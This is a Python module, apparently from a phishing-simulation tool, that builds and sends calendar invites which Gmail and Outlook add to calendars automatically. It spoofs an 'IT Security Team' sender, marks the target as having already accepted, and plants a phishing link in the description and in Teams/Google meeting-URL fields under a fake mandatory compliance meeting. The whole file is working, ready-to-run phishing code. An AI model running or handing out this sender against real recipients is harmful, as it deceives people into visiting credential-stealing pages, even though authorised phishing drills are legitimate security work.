"""Google Calendar invite sender — weaponizes iCalendar auto-processing.

Adapted from Tangled (https://github.com/ineesdv/Tangled) — Apache-2.0 License.

Strategy: Sends a regular phishing email with an .ics file attached.
The .ics uses METHOD:REQUEST so Gmail/Outlook auto-add the event to the calendar.
This is more reliable than the text/calendar MIME approach.
"""

import os
import ssl
import uuid
import smtplib
import logging
import re
from datetime import datetime, timezone, timedelta
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

logger = logging.getLogger(__name__)

SMTP_HOST = os.getenv("SMTP_HOST", "localhost")
SMTP_PORT = int(os.getenv("SMTP_PORT", "1025"))
SMTP_USER = os.getenv("SMTP_USER", "")
SMTP_PASS = os.getenv("SMTP_PASS", "")
SMTP_TLS = os.getenv("SMTP_TLS", "false").lower() in ("true", "1", "yes")

FROM_EMAIL = os.getenv("FROM_EMAIL", "security@company-it.com")
FROM_NAME = os.getenv("FROM_NAME", "IT Security Team")


def build_ics(
    uid: str,
    organizer_name: str,
    organizer_email: str,
    attendee_name: str,
    attendee_email: str,
    summary: str,
    description: str,
    begin_dt: datetime,
    end_dt: datetime,
    phish_url: str = "",
    location: str = "Microsoft Teams Meeting",
) -> str:
    """Build an RFC 5546 iCalendar string.

    METHOD:REQUEST causes Gmail/Outlook to auto-add the event.
    PARTSTAT=ACCEPTED makes it look like the target already accepted.
    """
    now_utc = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    begin_str = begin_dt.strftime("%Y%m%dT%H%M%SZ")
    end_str = end_dt.strftime("%Y%m%dT%H%M%SZ")

    # Inject phishing link into description
    desc = description
    if phish_url:
        desc += f"\\n\\nJoin meeting: {phish_url}"

    ics = (
        "BEGIN:VCALENDAR\r\n"
        "VERSION:2.0\r\n"
        "PRODID:-//PhishGuard//CalendarInvite//EN\r\n"
        "METHOD:REQUEST\r\n"
        "BEGIN:VEVENT\r\n"
        f"UID:{uid}\r\n"
        f"DTSTAMP:{now_utc}\r\n"
        f"DTSTART:{begin_str}\r\n"
        f"DTEND:{end_str}\r\n"
        f'ORGANIZER;CN="{organizer_name}":mailto:{organizer_email}\r\n'
        f'ATTENDEE;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;'
        f'RSVP=TRUE;CN="{attendee_name}":mailto:{attendee_email}\r\n'
        f"SUMMARY:{summary}\r\n"
        f"DESCRIPTION:{desc}\r\n"
        f"LOCATION:{location}\r\n"
        "STATUS:CONFIRMED\r\n"
        "SEQUENCE:0\r\n"
        "CLASS:PUBLIC\r\n"
        "PRIORITY:5\r\n"
        "TRANSP:OPAQUE\r\n"
        "X-MICROSOFT-CDO-BUSYSTATUS:TENTATIVE\r\n"
        "X-MICROSOFT-CDO-INTENDEDSTATUS:BUSY\r\n"
        "X-MICROSOFT-CDO-ALLDAYEVENT:FALSE\r\n"
        "X-MICROSOFT-CDO-IMPORTANCE:1\r\n"
        f"X-MICROSOFT-SKYPETEAMSMEETINGURL:{phish_url}\r\n"
        f"X-GOOGLE-CONFERENCE:{phish_url}\r\n"
        "BEGIN:VALARM\r\n"
        "ACTION:DISPLAY\r\n"
        "DESCRIPTION:REMINDER\r\n"
        "TRIGGER;RELATED=START:-PT15M\r\n"
        "END:VALARM\r\n"
        "END:VEVENT\r\n"
        "END:VCALENDAR\r\n"
    )
    return ics


def send_calendar_invite(
    to_email: str,
    to_name: str,
    subject: str,
    body_html: str,
    phish_url: str = "",
    meeting_summary: str = "Mandatory: Annual Security Compliance Review",
    description: str = "Please join this mandatory security review meeting.",
    **kwargs,
) -> bool:
    """Send a phishing email with an .ics calendar invite attached.

    The .ics file auto-adds to Gmail/Outlook calendars.
    This is more reliable than the inline text/calendar approach.
    """
    if not to_email:
        logger.warning("No email address provided for calendar invite")
        return False

    try:
        # Schedule meeting 2 hours from now, 30 min duration
        begin_dt = datetime.now(timezone.utc) + timedelta(hours=2)
        end_dt = begin_dt + timedelta(minutes=30)
        cal_uid = str(uuid.uuid4())

        # Build the .ics content
        ics_content = build_ics(
            uid=cal_uid,
            organizer_name=FROM_NAME,
            organizer_email=FROM_EMAIL,
            attendee_name=to_name or to_email,
            attendee_email=to_email,
            summary=meeting_summary,
            description=description,
            begin_dt=begin_dt,
            end_dt=end_dt,
            phish_url=phish_url,
        )

        # Build the email
        msg = MIMEMultipart("mixed")
        msg["Subject"] = subject
        msg["From"] = f"{FROM_NAME} <{FROM_EMAIL}>"
        msg["To"] = to_email

        # HTML body part
        if body_html:
            # Wrap in HTML if needed
            if "<html" not in body_html.lower():
                html_body = f"""<!DOCTYPE html>
<html>
<head><style>
    body {{ font-family: Arial, sans-serif; color: #333; line-height: 1.6; }}
    .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
</style></head>
<body><div class="container">{body_html}</div></body>
</html>"""
            else:
                html_body = body_html

            # Plain text fallback
            plain = re.sub(r"<[^>]+>", "", body_html).strip()
            alt = MIMEMultipart("alternative")
            alt.attach(MIMEText(plain, "plain", "utf-8"))
            alt.attach(MIMEText(html_body, "html", "utf-8"))
            msg.attach(alt)

        # Attach the .ics file — two ways for max compatibility:

        # Way 1: text/calendar part (for auto-processing)
        cal_part = MIMEText(ics_content, "calendar", "utf-8")
        cal_part.add_header("Content-Type", "text/calendar", method="REQUEST", charset="utf-8")
        cal_part.add_header("Content-Disposition", "inline", filename="invite.ics")
        msg.attach(cal_part)

        # Way 2: Also attach as .ics file download (fallback)
        ics_attachment = MIMEBase("application", "ics")
        ics_attachment.set_payload(ics_content.encode("utf-8"))
        encoders.encode_base64(ics_attachment)
        ics_attachment.add_header("Content-Disposition", "attachment", filename="meeting.ics")
        msg.attach(ics_attachment)

        # Send via SMTP
        if SMTP_TLS or SMTP_PORT == 587:
            server = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30)
            server.ehlo()
            server.starttls(context=ssl.create_default_context())
            server.ehlo()
        elif SMTP_PORT == 465:
            server = smtplib.SMTP_SSL(SMTP_HOST, SMTP_PORT, timeout=30,
                                       context=ssl.create_default_context())
        else:
            server = smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=30)

        if SMTP_USER and SMTP_PASS:
            server.login(SMTP_USER, SMTP_PASS)

        server.sendmail(FROM_EMAIL, to_email, msg.as_string())
        server.quit()

        logger.info(f"📅 Calendar invite sent to {to_email} (UID: {cal_uid})")
        return True

    except Exception as e:
        logger.error(f"Calendar invite failed to {to_email}: {e}")
        return False
